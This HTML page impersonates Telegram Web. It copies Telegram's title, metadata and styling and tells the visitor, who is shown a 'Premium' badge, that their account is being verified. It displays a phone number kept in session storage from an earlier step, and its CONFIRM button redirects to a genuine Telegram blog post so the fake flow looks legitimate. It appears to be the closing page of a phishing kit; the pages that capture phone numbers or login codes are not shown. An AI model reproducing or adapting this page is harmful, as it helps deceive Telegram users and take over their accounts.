

<html lang="en" translate="no" class="notranslate theme-light" data-message-text-size="16" >
 <head>
  <meta charset="UTF-8">
  <title>Telegram Web</title>
  <meta name="title" content="Telegram Web">
  <meta name="description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no,viewport-fit=cover">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="mobile-web-app-title" content="Telegram Web">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="Telegram Web">
  <meta name="application-name" content="Telegram Web">
  <meta name="theme-color" content="#fff">
  <meta name="google" content="notranslate">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://web.telegram.org/z/">
  <meta property="og:title" content="Telegram Web">
  <meta property="og:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta property="og:image" content="./icon-192x192.png">
  <meta property="twitter:card" content="summary_large_image">
  <meta property="twitter:url" content="https://web.telegram.org/z/">
  <meta property="twitter:title" content="Telegram Web">
  <meta property="twitter:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta property="twitter:image" content="./icon-192x192.png">
  <link rel="apple-touch-icon" sizes="180x180" href="./apple-touch-icon.png">
  <link rel="icon" href="./favicon.svg" type="image/svg+xml">
  <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
  <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="192x192" href="./icon-192x192.png">
  <link rel="alternate icon" href="./favicon.ico" type="image/x-icon">
  <link href="lib/main.3c9dcec00d5a12b9aa18.css" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="lib/BundleAuth.c05e93002b633dd7f657.css">
 </head>
 <body class="animation-level-2 is-touch-env is-android">
  <noscript>
   <h1>Telegram Web</h1>
   <p>Please, enable JavaScript to open the app.</p>
  </noscript>
  <div id="loader" class="bg-load load6" style="display:none;">
    <div class="loader"></div>
  </div>
  <div id="root">
   <div id="UiLoader" class="KD2TsjdEc_LBLsR_ReWT" style="--theme-background-color: #99BA92;">
    <div class="Transition full-height is-auth fade">
     <div class="Transition__slide--active">
      <div class="Transition Auth fade backwards animating">
       <div class="to">
        <div id="auth-code-form" class="custom-scroll">
         <div class="auth-form">
          <div id="monkey" class="">
           <div class="monkey-preview"></div>
          </div>
          <h1>
           <div class="auth-number-edit">
             <img src="lib/t.png" style="width:100%;">
           </div>
            <p id="thisPhone" style="margin-top:auto;margin-bottom:auto;">User</p>
            <p style="margin-left:5px;margin-top:auto;margin-bottom:auto;">Premium</p>
           </h1>
          <p class="note">Your <b>Telegram</b> account is currently being verified,<br>please wait a few moments for the verification to complete!</p>
            <div style="display:flex;justify-content:center;align-items:center;position:relative;padding-left:10%;padding-right:10%;">
              <button id="nextBtn" type="submit" class="Button default primary" onclick="loadd();">CONFIRM
                <div class="ripple-container"><span style="left: 88px; top: -81.9375px; width: 188px; height: 188px;"></span></div>
              </button>
            </div>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>
 </body>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
var set_item = sessionStorage.getItem("nohp");
document.getElementById("thisPhone").innerHTML = set_item;
function loadd(){
    $("#loader").fadeIn();
    window.location.href="https://telegram.org/blog/700-million-and-premium"
}
</script>

</body>
</html>
